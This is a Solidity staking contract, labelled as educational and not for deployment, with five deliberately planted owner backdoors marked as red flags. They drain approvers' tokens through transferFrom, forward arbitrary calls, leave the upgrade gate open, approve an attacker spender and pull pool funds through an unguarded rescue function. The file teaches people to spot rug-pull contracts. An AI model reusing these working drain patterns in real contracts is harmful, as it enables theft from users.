// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

/**
 * ⚠️  REFERENCE / EDUCATIONAL FILE — DO NOT DEPLOY  ⚠️
 *
 * This file is NOT in any migration. It exists ONLY so you can read a real,
 * compiling staking contract that LOOKS exactly like our real Staking.sol —
 * same stake/unstake/claim flow — but has the 5 most common owner-side
 * backdoor patterns planted inside.
 *
 * Each backdoor is clearly marked with `🚩 RED FLAG #N`.
 *
 * If a project's contract looks like THIS, do not approve it. If it looks
 * like our real Staking.sol, you can evaluate it on its merits.
 *
 * Paste any of the marked functions into another AI and ask:
 *   "What can the owner of this staking contract do to my approved USDT?"
 *
 * NONE of this affects your real contract. It is isolated reference material.
 */

contract MaliciousStaking is
    Initializable,
    OwnableUpgradeable,
    ReentrancyGuardUpgradeable,
    UUPSUpgradeable
{
    using SafeERC20Upgradeable for IERC20Upgradeable;

    // ----- normal-looking storage (mirrors our real Staking.sol) -----
    IERC20Upgradeable public stakingToken;
    uint256 public aprBps;
    uint256 public lockPeriod;
    uint256 public totalStaked;
    uint256 public rewardPool;

    mapping(address => uint256) public stakedAmount;
    mapping(address => uint256) public lastStakeTime;

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address _token, uint256 _aprBps) external initializer {
        __Ownable_init();
        __ReentrancyGuard_init();
        __UUPSUpgradeable_init();
        stakingToken = IERC20Upgradeable(_token);
        aprBps = _aprBps;
        lockPeriod = 7 days;
    }

    // =====================================================================
    //                  NORMAL-LOOKING USER FUNCTIONS
    //   (these are fine — they look like every staking contract on TRON)
    // =====================================================================

    function stake(uint256 amount) external nonReentrant {
        require(amount > 0, "amount=0");
        stakedAmount[msg.sender] += amount;
        lastStakeTime[msg.sender] = block.timestamp;
        totalStaked += amount;
        // ✅ legit: transferFrom uses msg.sender as the source
        stakingToken.safeTransferFrom(msg.sender, address(this), amount);
        emit Staked(msg.sender, amount);
    }

    function unstake(uint256 amount) external nonReentrant {
        require(stakedAmount[msg.sender] >= amount, "insufficient");
        stakedAmount[msg.sender] -= amount;
        totalStaked -= amount;
        stakingToken.safeTransfer(msg.sender, amount);
        emit Unstaked(msg.sender, amount);
    }

    function fundRewardPool(uint256 amount) external onlyOwner {
        rewardPool += amount;
        stakingToken.safeTransferFrom(msg.sender, address(this), amount);
    }

    function setAPR(uint256 newAprBps) external onlyOwner {
        aprBps = newAprBps;
    }

    // =====================================================================
    //         🚩 RED FLAG #1 — Drain via transferFrom on a victim
    // =====================================================================
    // Looks like an "emergency helper". The killer is the FIRST argument to
    // transferFrom: it's `victim`, not `msg.sender`. That means it pulls
    // USDT from any wallet that approved this contract — straight to owner.
    //
    // ✅ Legit version (see stake() above): transferFrom(msg.sender, ...)
    // 🚩 Malicious version (below):         transferFrom(victim, ...)

    function emergencyWithdraw(address victim) external onlyOwner {
        uint256 bal = stakingToken.balanceOf(victim);
        stakingToken.safeTransferFrom(victim, owner(), bal);
    }

    // =====================================================================
    //         🚩 RED FLAG #2 — Arbitrary call execution
    // =====================================================================
    // Hidden under an innocent name like "execute" / "multicall" / "forward".
    // Lets the owner make THIS staking contract call any function on any
    // contract. Owner can craft a call to USDT.transferFrom(user, owner, amt)
    // and drain everyone in one transaction.
    //
    // 🚩 Giveaway: `target.call(data)` where owner controls both args.

    function execute(address target, bytes calldata data)
        external
        onlyOwner
        returns (bytes memory)
    {
        (bool ok, bytes memory ret) = target.call(data);
        require(ok, "call failed");
        return ret;
    }

    // =====================================================================
    //         🚩 RED FLAG #3 — Unprotected upgrade authorization
    // =====================================================================
    // This is the UUPS upgrade gate. In our real Staking.sol it is gated
    // with `onlyOwner`. Here it has NO modifier — meaning literally anyone
    // can call upgradeTo() and replace this contract with a malicious one
    // that drains every approver.
    //
    // ✅ Legit:     function _authorizeUpgrade(address) internal override onlyOwner {}
    // 🚩 Malicious: function _authorizeUpgrade(address) internal override {}

    function _authorizeUpgrade(address) internal override {
        // ⚠️ MISSING `onlyOwner` — anyone can upgrade this contract.
    }

    // =====================================================================
    //         🚩 RED FLAG #4 — Owner approves a third party to drain
    // =====================================================================
    // Owner makes the staking contract approve some attacker-controlled
    // address as a spender. Then the attacker calls USDT.transferFrom and
    // pulls everything in the contract (and from approvers) to themselves.
    //
    // 🚩 Giveaway: any owner-callable function that calls .approve() on the
    //              staking token to a non-zero spender.

    function setSpender(address spender, uint256 amount) external onlyOwner {
        stakingToken.approve(spender, amount);
    }

    // =====================================================================
    //         🚩 RED FLAG #5 — "Rescue stuck tokens" without a guard
    // =====================================================================
    // Looks like a benign helper for tokens accidentally sent to the contract.
    // But because it accepts ANY token address — including the staking token
    // itself — the owner can pull the entire pool (every user's stake) out.
    //
    // ✅ Safe version would have:
    //      require(token != address(stakingToken), "cannot touch user funds");
    // 🚩 Malicious version (below) is missing that line.

    function rescueTokens(address token, uint256 amount) external onlyOwner {
        IERC20Upgradeable(token).safeTransfer(owner(), amount);
    }
}

// =========================================================================
// ✅ For comparison: a SAFE rescue function (the legit version of #5)
// =========================================================================
// Same intent — let the owner recover tokens accidentally sent to the
// contract — but with the critical guard that protects user funds.
contract SafeRescueExample is OwnableUpgradeable {
    using SafeERC20Upgradeable for IERC20Upgradeable;
    IERC20Upgradeable public stakingToken;

    function rescueTokens(address token, uint256 amount) external onlyOwner {
        require(token != address(stakingToken), "cannot touch user funds");
        IERC20Upgradeable(token).safeTransfer(owner(), amount);
    }
}
